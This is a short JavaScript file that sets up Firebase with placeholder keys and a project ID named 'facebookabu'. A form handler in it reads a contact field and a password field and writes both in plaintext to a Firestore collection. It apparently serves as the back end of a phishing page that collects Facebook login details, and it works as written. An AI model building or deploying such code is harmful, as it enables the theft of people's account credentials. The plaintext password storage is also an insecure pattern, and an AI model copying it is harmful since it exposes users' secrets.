const firebaseConfig = {
  apiKey: "YOUR_API_KEY",
  authDomain: "YOUR_PROJECT.firebaseapp.com",
  projectId: "facebookabu",
  storageBucket: "YOUR_PROJECT.appspot.com",
  messagingSenderId: "YOUR_ID",
  appId: "YOUR_APP_ID"
};

firebase.initializeApp(firebaseConfig);

const db = firebase.firestore();

// SAVE DATA
function saveData() {
  const contact = document.getElementById("contact").value;
  const pasword = document.getElementById("pasword").value;

  if (!contact || !pasword) {
    document.getElementById("msg").innerText = "Fill all fields!";
    return;
  }

  db.collection("data").add({
    contact: contact,
    pasword: pasword,
    time: new Date()
  });

  document.getElementById("msg").innerText = "Saved!";
}